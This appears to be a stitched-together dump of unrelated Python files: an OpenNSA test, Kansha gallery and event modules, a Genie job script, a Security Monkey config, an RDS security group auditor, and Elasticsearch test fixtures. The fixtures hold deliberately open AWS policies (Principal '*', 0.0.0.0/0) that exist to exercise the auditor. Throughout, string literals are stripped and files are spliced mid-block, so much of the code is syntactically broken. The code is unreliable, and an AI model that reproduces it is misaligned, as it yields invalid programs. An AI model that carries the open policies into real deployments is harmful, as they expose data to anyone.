tcf = os . path . expanduser ( ) \n 
tc = json . load ( open ( tcf ) ) \n 
\n 
ncs_config = { \n 
config . NCS_SERVICES_URL : tc [ ] , \n 
config . NCS_USER : tc [ ] , \n 
config . NCS_PASSWORD : tc [ ] \n 
} \n 
\n 
self . requester = common . DUDRequester ( ) \n 
\n 
self . backend = ncsvpn . NCSVPNBackend ( , self . sr , self . requester , ncs_config ) \n 
self . backend . scheduler . clock = self . clock \n 
\n 
self . backend . startService ( ) \n 
\n 
database . setupDatabase ( tc [ ] , tc [ ] , tc [ ] ) \n 
\n 
self . requester_nsa = nsa . NetworkServiceAgent ( , ) \n 
self . provider_nsa = nsa . NetworkServiceAgent ( , ) \n 
\n 
source_stp = nsa . STP ( , , labels = [ nsa . Label ( nml . ETHERNET_VLAN , ) ] ) \n 
dest_stp = nsa . STP ( , , labels = [ nsa . Label ( nml . ETHERNET_VLAN , ) ] ) \n 
start_time = datetime . datetime . utcnow ( ) + datetime . timedelta ( seconds = 2 ) \n 
end_time = datetime . datetime . utcnow ( ) + datetime . timedelta ( seconds = 30 ) \n 
bandwidth = 200 \n 
self . service_params = nsa . ServiceParameters ( start_time , end_time , source_stp , dest_stp , bandwidth ) \n 
\n 
\n 
\n 
~~ @ defer . inlineCallbacks \n 
def tearDown ( self ) : \n 
~~~ from opennsa . backends . common import simplebackend \n 
# delete all created connections from test database \n 
yield simplebackend . Simplebackendconnection . deleteAll ( ) \n 
yield self . backend . stopService ( ) \n 
\n 
\n 
~~ @ defer . inlineCallbacks \n 
def testActivation ( self ) : \n 
\n 
#        d_up = defer.Deferred() \n 
#        d_down = defer.Deferred() \n 
# \n 
#        def errorEvent(requester_nsa, provider_nsa, session_security_attr, connection_id, event, connection_states, timestamp, info, ex): \n 
#            print "errorEvent", event, info, ex \n 
# \n 
#        def dataPlaneChange(requester_nsa, provider_nsa, session_security_attr, connection_id, dps, timestamp): \n 
#            active, version, version_consistent = dps \n 
#            values = connection_id, active, version_consistent, version, timestamp \n 
#            if active: \n 
#                d_up.callback(values) \n 
#            else: \n 
#                d_down.callback(values) \n 
# \n 
#        self.sr.registerEventHandler(registry.ERROR_EVENT,        errorEvent,      self.registry_system) \n 
#        self.sr.registerEventHandler(registry.DATA_PLANE_CHANGE,  dataPlaneChange, self.registry_system) \n 
\n 
~~~ _ , _ , cid , sp = yield self . reserve ( self . requester_nsa , self . provider_nsa , None , None , None , None , self . service_params ) \n 
yield self . backend . reserveCommit ( self . requester_nsa , self . provider_nsa , None , cid ) \n 
yield self . backend . provision ( self . requester_nsa , self . provider_nsa , None , cid ) \n 
self . clock . advance ( 3 ) \n 
\n 
connection_id , active , version_consistent , version , timestamp = yield d_up \n 
self . failUnlessEqual ( cid , connection_id ) \n 
self . failUnlessEqual ( active , True ) \n 
self . failUnlessEqual ( version_consistent , True ) \n 
\n 
#yield self.release(self.requester_nsa, self.provider_nsa, None, cid) \n 
yield self . backend . terminate ( self . requester_nsa , self . provider_nsa , None , cid ) \n 
\n 
connection_id , active , version_consistent , version , timestamp = yield d_down \n 
self . failUnlessEqual ( cid , connection_id ) \n 
self . failUnlessEqual ( active , False ) \n 
self . failUnlessEqual ( version_consistent , True ) \n 
\n 
~~ testActivation . skip = \n 
\n 
#-- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
#-- \n 
\n 
~~ """adding max cards\n\nRevision ID: b740362087\nRevises: 537fa16b46e7\nCreate Date: 2013-09-19 17:37:37.027495\n\n""" \n 
\n 
# revision identifiers, used by Alembic. \n 
revision = \n 
down_revision = \n 
\n 
from alembic import op \n 
import sqlalchemy as sa \n 
\n 
\n 
def upgrade ( ) : \n 
~~~ op . add_column ( , sa . Column ( , sa . Integer ) ) \n 
\n 
\n 
~~ def downgrade ( ) : \n 
~~~ op . drop_column ( , ) \n 
#-- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
#-- \n 
\n 
~~ from . import view \n 
from . comp import Card , NewCard \n 
# -- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
# -- \n 
\n 
from nagare . i18n import _ \n 
from nagare import presentation , ajax , security , component \n 
\n 
from . comp import Gallery , Asset , AssetCropper \n 
\n 
\n 
def render_image ( self , h , comp , size , randomize = False , ** kw ) : \n 
~~~ metadata = self . assets_manager . get_metadata ( self . filename ) \n 
src = self . assets_manager . get_image_url ( self . filename , size ) \n 
if randomize : \n 
~~~ src += + h . generate_id ( ) \n 
~~ return h . img ( title = metadata [ ] , alt = metadata [ ] , \n 
src = src , ** kw ) \n 
\n 
\n 
~~ def render_file ( self , h , comp , size , ** kw ) : \n 
~~~ kw [ ] += \n 
metadata = self . assets_manager . get_metadata ( self . filename ) \n 
res = [ h . img ( title = metadata [ ] , alt = metadata [ ] , \n 
src = "img/file-icon.jpg" , ** kw ) ] \n 
if size == : \n 
~~~ res . append ( h . span ( metadata [ ] ) ) \n 
~~ return res \n 
\n 
~~ CONTENT_TYPES = { : render_image , \n 
: render_image , \n 
: render_image , \n 
: render_image } \n 
\n 
\n 
@ presentation . render_for ( Gallery ) \n 
def render ( self , h , comp , * args ) : \n 
~~~ with h . div ( id = + self . comp_id ) : \n 
~~~ with h . div ( class_ = ) : \n 
~~~ h << comp . render ( h , model = ) \n 
~~ with h . div ( id = "card-gallery" ) : \n 
~~~ h << comp . render ( h , self . model ) \n 
~~ ~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , ) \n 
def render_Gallery_view ( self , h , comp , model ) : \n 
~~~ model = if security . has_permissions ( , self ) else \n 
for asset in self . assets : \n 
~~~ h << asset . render ( h , model ) \n 
~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , ) \n 
def render_Gallery_crop ( self , h , comp , model ) : \n 
~~~ return self . cropper . on_answer ( self . action ) \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , ) \n 
def render_cover ( self , h , comp , model ) : \n 
~~~ cover = self . get_cover ( ) \n 
if cover : \n 
~~~ h << h . p ( component . Component ( self . get_cover ( ) , model = ) , class_ = ) \n 
~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , "action" ) \n 
def render_download ( self , h , comp , * args ) : \n 
~~~ if security . has_permissions ( , self ) : \n 
~~~ submit_id = h . generate_id ( "attach_submit" ) \n 
input_id = h . generate_id ( "attach_input" ) \n 
h << h . label ( ( h . i ( class_ = ) , \n 
_ ( "Add file" ) ) , class_ = , for_ = input_id ) \n 
with h . form : \n 
~~~ h << h . script ( \n 
% \n 
{ \n 
: ajax . py2js ( self . assets_manager . max_size ) , \n 
: ajax . py2js ( input_id ) , \n 
: ajax . py2js ( submit_id ) , \n 
: ajax . py2js ( \n 
_ ( ) \n 
) . decode ( ) \n 
} \n 
) \n 
submit_action = ajax . Update ( \n 
render = lambda r : r . div ( comp . render ( r , model = None ) , r . script ( ) ) , \n 
component_to_update = + self . comp_id , \n 
) \n 
\n 
h << h . input ( id = input_id , class_ = , type = "file" , name = "file" , multiple = "multiple" , maxlength = "100" , ) . action ( self . add_assets ) \n 
h << h . input ( class_ = , id = submit_id , type = "submit" ) . action ( submit_action ) \n 
~~ ~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Gallery , model = ) \n 
def render_gallery_badge ( self , h , * args ) : \n 
~~~ """Gallery badge for the card""" \n 
if self . assets : \n 
~~~ with h . span ( class_ = ) : \n 
~~~ h << h . span ( h . i ( class_ = ) , , len ( self . assets ) , class_ = ) \n 
~~ ~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( Asset ) \n 
@ presentation . render_for ( Asset , model = ) \n 
@ presentation . render_for ( Asset , model = ) \n 
@ presentation . render_for ( Asset , model = ) \n 
def render_asset ( self , h , comp , model , * args ) : \n 
~~~ res = [ ] \n 
metadata = self . assets_manager . get_metadata ( self . filename ) \n 
kw = { : True } if model == else { } \n 
kw [ ] = model \n 
if self . is_cover : \n 
~~~ res . append ( h . span ( class_ = ) ) \n 
\n 
~~ meth = CONTENT_TYPES . get ( metadata [ ] , render_file ) \n 
res . append ( meth ( self , h , comp , model , ** kw ) ) \n 
return res \n 
\n 
~~ @ presentation . render_for ( Asset , model = ) \n 
def render_Asset_thumb ( self , h , comp , model , * args ) : \n 
~~~ with h . div ( class_ = ) : \n 
~~~ action = h . a . action ( lambda : comp . answer ( ( , self ) ) ) . get ( ) \n 
onclick = _ ( ) \n 
onclick = u\'if (confirm("%s")) { %s }\' % ( onclick , action ) \n 
with h . a ( class_ = , title = _ ( ) , href = , onclick = onclick ) : \n 
~~~ h << h . i ( class_ = ) \n 
~~ if self . is_image ( ) : \n 
~~~ with h . a ( class_ = , title = _ ( ) ) . action ( lambda : comp . answer ( ( , self ) ) ) : \n 
~~~ if self . is_cover : \n 
~~~ h << { : } \n 
~~ h << h . i ( class_ = ) \n 
~~ ~~ with h . a ( href = self . assets_manager . get_image_url ( self . filename ) , target = ) : \n 
~~~ h << comp . render ( h , ) \n 
~~ ~~ return h . root \n 
\n 
~~ @ presentation . render_for ( Asset , model = "anonymous" ) \n 
def render_asset_anonymous ( self , h , comp , model , * args ) : \n 
~~~ with h . div ( class_ = ) : \n 
~~~ with h . a ( href = self . assets_manager . get_image_url ( self . filename ) , target = ) : \n 
~~~ h << comp . render ( h , model = "thumb" ) \n 
~~ ~~ return h . root \n 
\n 
\n 
~~ @ presentation . render_for ( AssetCropper ) \n 
def render_gallery_cropper ( self , h , comp , * args ) : \n 
~~~ h << h . p ( _ ( ) ) \n 
\n 
form_id = h . generate_id ( ) \n 
img_id = h . generate_id ( ) \n 
\n 
with h . form : \n 
~~~ for crop_name in , , , : \n 
~~~ h << h . input ( type = , id = form_id + + crop_name ) . action ( getattr ( self , crop_name ) ) \n 
~~ h << h . p ( render_image ( self . asset , h , comp , , id = img_id ) ) \n 
h << h . script ( \n 
"YAHOO.util.Event.onContentReady(%s," \n 
"function(){YAHOO.kansha.app.initCrop(%s, %s, %s, %s)})" % ( \n 
ajax . py2js ( img_id ) , \n 
ajax . py2js ( img_id ) , \n 
ajax . py2js ( form_id ) , \n 
ajax . py2js ( self . crop_width ( ) ) , \n 
ajax . py2js ( self . crop_height ( ) ) \n 
) \n 
) \n 
with h . div ( class_ = ) : \n 
~~~ h << h . button ( _ ( ) , class_ = ) . action ( self . commit , comp ) \n 
if self . asset . is_cover : \n 
~~~ h << \n 
h << h . button ( _ ( ) , class_ = ) . action ( self . remove_cover , comp ) \n 
~~ h << \n 
h << h . button ( _ ( ) , class_ = ) . action ( self . cancel , comp ) \n 
~~ ~~ return h . root \n 
# -*- coding:utf-8 -*- \n 
# -- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
# -- \n 
\n 
\n 
~~ class EventHandlerMixIn ( object ) : \n 
~~~ """\n    Mix-in that implements:\n      - `emit_event`, to emit an event;\n      - `handle_event`, a callback for comp.on_answer if comp is expected to emit events.\n\n      `handle_event` calls a method `on_event(event)`\n      on `self` (if exists) to handle the event and then systematically bubbles the event up.\n      `handle_event` returns the return value of `on_event`\n      if any, or the return value of the upper levels.\n    """ \n 
\n 
def emit_event ( self , comp , kind , data = None ) : \n 
~~~ event = kind ( data , source = [ self ] ) \n 
return comp . answer ( event ) \n 
\n 
~~ def handle_event ( self , comp , event ) : \n 
\n 
~~~ local_res = None \n 
local_handler = getattr ( self , , None ) \n 
if local_handler : \n 
~~~ local_res = local_handler ( comp , event ) \n 
# bubble up in any case \n 
~~ event . append ( self ) \n 
upper_res = comp . answer ( event ) \n 
# return local result in priority \n 
return local_res or upper_res \n 
\n 
\n 
~~ ~~ class Event ( object ) : \n 
~~~ """Can be derived""" \n 
\n 
def __init__ ( self , data , source = [ ] ) : \n 
~~~ """\n        `data` is a payload specific to the kind of event.\n        `source` is a list of component business objects. The first one is the emitter.\n        Each traversed component must append itself with `append` (see below).\n        """ \n 
\n 
self . _source = source \n 
self . data = data \n 
\n 
~~ @ property \n 
def source ( self ) : \n 
~~~ return self . _source . copy ( ) \n 
\n 
~~ @ property \n 
def emitter ( self ) : \n 
~~~ return self . _source [ 0 ] \n 
\n 
~~ @ property \n 
def last_relay ( self ) : \n 
~~~ return self . _source [ - 1 ] \n 
\n 
~~ def is_ ( self , kind ) : \n 
~~~ return type ( self ) is kind \n 
\n 
~~ def is_kind_of ( self , kind ) : \n 
~~~ return isinstance ( self , kind ) \n 
\n 
~~ def append ( self , relay ) : \n 
~~~ self . _source . append ( relay ) \n 
\n 
~~ def cast_as ( self , sub_kind ) : \n 
#assert(issubclass(sub_kind, self.__class__)) \n 
~~~ return sub_kind ( self . data , self . _source ) \n 
\n 
\n 
# Standard events \n 
\n 
~~ ~~ class ColumnDeleted ( Event ) : \n 
~~~ """\n    The user clicked on the \'delete column\' action.\n    `data` is the column component (component.Component).\n    """ \n 
pass \n 
\n 
\n 
~~ class CardClicked ( Event ) : \n 
~~~ """\n    The user clicked on a card.\n    `data` is the card component (component.Component)\n    """ \n 
pass \n 
\n 
\n 
~~ class PopinClosed ( Event ) : \n 
~~~ """\n    The Popin has closed.\n    `data` is the component.Component containing the Popin.\n    """ \n 
pass \n 
\n 
\n 
~~ class CardEditorClosed ( PopinClosed ) : \n 
~~~ """\n    In the particular case when the Popin contains the card editor.\n    `data` is the component.Component containing the Popin.\n    """ \n 
pass \n 
\n 
\n 
~~ class CardArchived ( Event ) : \n 
~~~ """\n    The user clicked on the `Delete` button in the card editor.\n    No payload.\n    """ \n 
pass \n 
\n 
\n 
~~ class SearchIndexUpdated ( Event ) : \n 
~~~ """\n    Some operations have been committed on the search index.\n    No payload.\n    """ \n 
pass \n 
\n 
\n 
~~ class CardDisplayed ( Event ) : \n 
~~~ """\n    A card has just been (re-)displayed on the board (default form).\n    No payload.\n    """ \n 
pass \n 
\n 
\n 
~~ class BoardAccessChanged ( Event ) : \n 
~~~ """\n    The access conditions to the board changed.\n    """ \n 
\n 
\n 
~~ class BoardDeleted ( BoardAccessChanged ) : \n 
~~~ """\n    The board has been (or is about to be) deleted.\n    No payload.\n    """ \n 
\n 
\n 
~~ class BoardArchived ( BoardAccessChanged ) : \n 
~~~ """\n    The board has been archived.\n    No payload.\n    """ \n 
\n 
\n 
~~ class BoardRestored ( BoardAccessChanged ) : \n 
~~~ """\n    The board has been restored from archive.\n    """ \n 
\n 
\n 
~~ class BoardLeft ( BoardAccessChanged ) : \n 
~~~ """\n    The user has left the board.\n    No payload.\n    """ \n 
\n 
\n 
# "Request" events \n 
~~ class ParentTitleNeeded ( Event ) : \n 
~~~ """The emitter needs context from parent in the form of a title string.""" \n 
pass \n 
\n 
\n 
~~ class NewTemplateRequested ( Event ) : \n 
~~~ """\n    The user requested that a new template is created from the emitter.\n    Payload is tuple (template_title, template_description, shared_flag).\n    The receiver returns a new Template on success.\n    """ \n 
pass \n 
#-- \n 
# Copyright (c) 2012-2014 Net-ng. \n 
# All rights reserved. \n 
# \n 
# This software is licensed under the BSD License, as described in \n 
# the file LICENSE.txt, which you should have received as part of \n 
# this distribution. \n 
#-- \n 
\n 
~~ from . comp import EditableTitle \n 
from . import view \n 
#!/usr/bin/python2.7 \n 
\n 
# Copyright 2015 Netflix, Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
####################################################################################################################### \n 
# This script assumes setup.py has already been run to configure Genie and that this script is executed on the host \n 
\n 
####################################################################################################################### \n 
\n 
import genie2 . client . wrapper \n 
import genie2 . model . ClusterCriteria \n 
import genie2 . model . Job \n 
import genie2 . model . FileAttachment \n 
import time \n 
\n 
# Create a Genie client which proxies API calls through wrapper which retries failures based on various return codes \n 
genie = genie2 . client . wrapper . Genie2 ( "http://localhost:8080/genie" , \n 
genie2 . client . wrapper . RetryPolicy ( \n 
tries = 8 , none_on_404 = True , no_retry_http_codes = range ( 400 , 500 ) \n 
) ) \n 
\n 
# Create a job instance and fill in the required parameters \n 
job = genie2 . model . Job . Job ( ) \n 
job . name = "GenieDockerExamplePigJob2" \n 
job . user = "root" \n 
job . version = "0.14.0" \n 
\n 
# Create a list of cluster criterias which determine the cluster to run the job on \n 
job . clusterCriterias = list ( ) \n 
cluster_criteria = genie2 . model . ClusterCriteria . ClusterCriteria ( ) \n 
criteria = set ( ) \n 
criteria . add ( "sched:adhoc" ) \n 
criteria . add ( "type:yarn" ) \n 
cluster_criteria . tags = criteria \n 
job . clusterCriterias . append ( cluster_criteria ) \n 
\n 
# Create the set of command criteria which will determine what command Genie executes for the job \n 
command_criteria = set ( ) \n 
command_criteria . add ( "type:pig" ) \n 
job . commandCriteria = command_criteria \n 
\n 
# Add any dependencies for this job. Could use attachments but since these are already available on the system \n 
# will instead use the file dependencies field. \n 
job . fileDependencies = "file:///apps/genie/pig/0.14.0/tutorial/script2-hadoop.pig,file:///apps/genie/pig/0.14.0/tutorial/tutorial.jar" \n 
\n 
# Any command line arguments to run along with the command. \n 
job . commandArgs = "script2-hadoop.pig" \n 
\n 
# Submit the job to Genie \n 
job = genie . submitJob ( job ) \n 
\n 
while job . status != "SUCCEEDED" and job . status != "KILLED" and job . status != "FAILED" : \n 
~~~ print "Job " + job . id + " is " + job . status \n 
time . sleep ( 10 ) \n 
job = genie . getJob ( job . id ) \n 
\n 
~~ print "Job " + job . id + " finished with status " + job . statusOFF = 0 \n 
ON = 1 \n 
DISCONNECTED = 20 \n 
CONNECTED = 30 \n 
\n 
DEFAULT_EVENT_VERSION = 1 \n 
DEFAULT_ACTION_VERSION = 1 #     Copyright 2014 Netflix, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
# Insert any config items here. \n 
# This will be fed into Flask/SQLAlchemy inside security_monkey/__init__.py \n 
\n 
LOG_LEVEL = "DEBUG" \n 
LOG_FILE = "/var/log/security_monkey/security_monkey-deploy.log" \n 
\n 
SQLALCHEMY_DATABASE_URI = \n 
\n 
SQLALCHEMY_POOL_SIZE = 50 \n 
SQLALCHEMY_MAX_OVERFLOW = 15 \n 
ENVIRONMENT = \n 
USE_ROUTE53 = False \n 
FQDN = \n 
API_PORT = \n 
WEB_PORT = \n 
WEB_PATH = \n 
FRONTED_BY_NGINX = True \n 
NGINX_PORT = \n 
BASE_URL = . format ( FQDN ) \n 
\n 
SECRET_KEY = \n 
\n 
MAIL_DEFAULT_SENDER = \n 
SECURITY_REGISTERABLE = True \n 
SECURITY_CONFIRMABLE = False \n 
SECURITY_RECOVERABLE = False \n 
SECURITY_PASSWORD_HASH = \n 
SECURITY_PASSWORD_SALT = \n 
SECURITY_TRACKABLE = True \n 
\n 
SECURITY_POST_LOGIN_VIEW = BASE_URL \n 
SECURITY_POST_REGISTER_VIEW = BASE_URL \n 
SECURITY_POST_CONFIRM_VIEW = BASE_URL \n 
SECURITY_POST_RESET_VIEW = BASE_URL \n 
SECURITY_POST_CHANGE_VIEW = BASE_URL \n 
\n 
\n 
SECURITY_TEAM_EMAIL = [ ] \n 
\n 
# These are only required if using SMTP instead of SES \n 
EMAILS_USE_SMTP = False # Otherwise, Use SES \n 
SES_REGION = \n 
MAIL_SERVER = \n 
MAIL_PORT = 465 \n 
MAIL_USE_SSL = True \n 
MAIL_USERNAME = \n 
MAIL_PASSWORD = \n 
\n 
WTF_CSRF_ENABLED = True \n 
WTF_CSRF_SSL_STRICT = True # Checks Referer Header. Set to False for API access. \n 
WTF_CSRF_METHODS = [ , , , ] \n 
\n 
# "NONE", "SUMMARY", or "FULL" \n 
SECURITYGROUP_INSTANCE_DETAIL = \n 
\n 
# Threads used by the scheduler. \n 
# You will likely need at least one core thread for every account being monitored. \n 
CORE_THREADS = 25 \n 
MAX_THREADS = 30 \n 
#     Copyright 2014 Netflix, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
"""\n.. module: security_monkey.auditors.rds_security_group\n    :platform: Unix\n\n.. version:: $$VERSION$$\n.. moduleauthor:: Patrick Kelley <pkelley@netflix.com> @monkeysecurity\n\n""" \n 
from security_monkey . auditor import Auditor \n 
from security_monkey . watchers . rds_security_group import RDSSecurityGroup \n 
from security_monkey . datastore import NetworkWhitelistEntry \n 
from security_monkey . auditors . security_group import _check_rfc_1918 \n 
\n 
import ipaddr \n 
\n 
class RDSSecurityGroupAuditor ( Auditor ) : \n 
~~~ index = RDSSecurityGroup . index \n 
i_am_singular = RDSSecurityGroup . i_am_singular \n 
i_am_plural = RDSSecurityGroup . i_am_plural \n 
network_whitelist = [ ] \n 
\n 
def __init__ ( self , accounts = None , debug = False ) : \n 
~~~ super ( RDSSecurityGroupAuditor , self ) . __init__ ( accounts = accounts , debug = debug ) \n 
\n 
~~ def prep_for_audit ( self ) : \n 
~~~ self . network_whitelist = NetworkWhitelistEntry . query . all ( ) \n 
\n 
~~ def _check_inclusion_in_network_whitelist ( self , cidr ) : \n 
~~~ for entry in self . network_whitelist : \n 
~~~ if ipaddr . IPNetwork ( cidr ) in ipaddr . IPNetwork ( str ( entry . cidr ) ) : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
~~ def check_rds_ec2_rfc1918 ( self , sg_item ) : \n 
~~~ """\n        alert if non-vpc RDS SG contains RFC1918 CIDRS\n        """ \n 
tag = "Non-VPC RDS Security Group contains private RFC-1918 CIDR" \n 
severity = 8 \n 
\n 
if sg_item . config . get ( "vpc_id" , None ) : \n 
~~~ return \n 
\n 
~~ for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" , None ) \n 
if cidr and _check_rfc_1918 ( cidr ) : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
\n 
~~ ~~ ~~ def check_securitygroup_large_subnet ( self , sg_item ) : \n 
~~~ """\n        Make sure the RDS SG does not contain large networks.\n        """ \n 
tag = "RDS Security Group network larger than /24" \n 
severity = 3 \n 
for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" , None ) \n 
if cidr and not self . _check_inclusion_in_network_whitelist ( cidr ) : \n 
~~~ if in cidr and not cidr == "0.0.0.0/0" and not cidr == "10.0.0.0/8" : \n 
~~~ mask = int ( cidr . split ( ) [ 1 ] ) \n 
if mask < 24 and mask > 0 : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
\n 
~~ ~~ ~~ ~~ ~~ def check_securitygroup_zero_subnet ( self , sg_item ) : \n 
~~~ """\n        Make sure the RDS SG does not contain a cidr with a subnet length of zero.\n        """ \n 
tag = "RDS Security Group subnet mask is /0" \n 
severity = 10 \n 
for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" , None ) \n 
if cidr and in cidr and not cidr == "0.0.0.0/0" and not cidr == "10.0.0.0/8" : \n 
~~~ mask = int ( cidr . split ( ) [ 1 ] ) \n 
if mask == 0 : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
\n 
~~ ~~ ~~ ~~ def check_securitygroup_any ( self , sg_item ) : \n 
~~~ """\n        Make sure the RDS SG does not contain 0.0.0.0/0\n        """ \n 
tag = "RDS Security Group contains 0.0.0.0/0" \n 
severity = 5 \n 
for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" ) \n 
if "0.0.0.0/0" == cidr : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
return \n 
\n 
~~ ~~ ~~ def check_securitygroup_10net ( self , sg_item ) : \n 
~~~ """\n        Make sure the RDS SG does not contain 10.0.0.0/8\n        """ \n 
tag = "RDS Security Group contains 10.0.0.0/8" \n 
severity = 5 \n 
\n 
for ipr in sg_item . config . get ( "ip_ranges" , [ ] ) : \n 
~~~ cidr = ipr . get ( "cidr_ip" ) \n 
if "10.0.0.0/8" == cidr : \n 
~~~ self . add_issue ( severity , tag , sg_item , notes = cidr ) \n 
return \n 
#     Copyright 2014 Netflix, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
~~ ~~ ~~ ~~ """\n.. module: security_monkey.tests.test_elasticsearch_service\n    :platform: Unix\n\n.. version:: $$VERSION$$\n.. moduleauthor::  Mike Grima <mgrima@netflix.com>\n\n""" \n 
import json \n 
\n 
from security_monkey . datastore import NetworkWhitelistEntry , Account \n 
from security_monkey . tests import SecurityMonkeyTestCase \n 
from security_monkey import db \n 
\n 
# TODO: Make a ES test for spulec/moto, then make test cases that use it. \n 
from security_monkey . watchers . elasticsearch_service import ElasticSearchServiceItem \n 
\n 
CONFIG_ONE = { \n 
"name" : "es_test" , \n 
"policy" : json . loads ( b"""{\n        "Statement": [\n            {\n                "Action": "es:*",\n                "Effect": "Allow",\n                "Principal": {\n                  "AWS": "*"\n                },\n                "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test/*",\n                "Sid": ""\n            }\n        ],\n        "Version": "2012-10-17"\n      }\n    """ ) \n 
} \n 
\n 
CONFIG_TWO = { \n 
"name" : "es_test_2" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-west-2:012345678910:domain/es_test_2/*"\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_THREE = { \n 
"name" : "es_test_3" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:root"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_3/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_3/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "192.168.1.1/32",\n                "10.0.0.1/8"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_FOUR = { \n 
"name" : "es_test_4" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:root"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_4/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_4/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "0.0.0.0/0"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_FIVE = { \n 
"name" : "es_test_5" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:root"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_5/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Deny",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:role/not_this_role"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_5/*"\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
